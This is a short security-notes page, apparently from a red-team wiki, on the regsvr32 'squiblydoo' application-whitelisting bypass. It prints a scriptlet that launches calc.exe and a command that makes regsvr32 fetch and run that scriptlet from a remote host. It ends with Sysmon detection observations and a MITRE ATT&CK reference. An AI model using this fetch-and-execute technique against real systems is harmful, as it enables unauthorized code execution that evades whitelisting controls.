---
description: regsvr32 (squiblydoo) code execution - bypass application whitelisting.
---

# regsvr32

### Execution

{% code title="<http://10.0.0.5/back.sct>" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```
{% endcode %}

We need to host the back.sct on a web server so we can invoke it like so:

{% code title="attacker\@victim" %}
```csharp
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```
{% endcode %}

### Observations

![calc.exe spawned by regsvr32.exe](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHFacr1L2eRZAPKD4kt%2F-LHFaljjT6HYczWn8BJF%2Fregsvr32.png?alt=media\&token=5dc059c4-1273-4d4f-8d0b-64be9e47e96f)

Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHFbPZwQGIyCHpsPj87%2F-LHFdaYNLHBaElS6JjYh%2Fregsvr32-commandline.png?alt=media\&token=bd9dec61-f80b-4772-a40a-795338a8e03e)

Additionally, of course sysmon will show regsvr32 establishing a network connection:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHFecHHBAMZ5CI1H5RX%2F-LHFeXmJeuBAGXEONuJD%2Fregsvr32-network.png?alt=media\&token=cc0bd39a-7878-4b24-898e-2330ed9b0769)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1117" %}
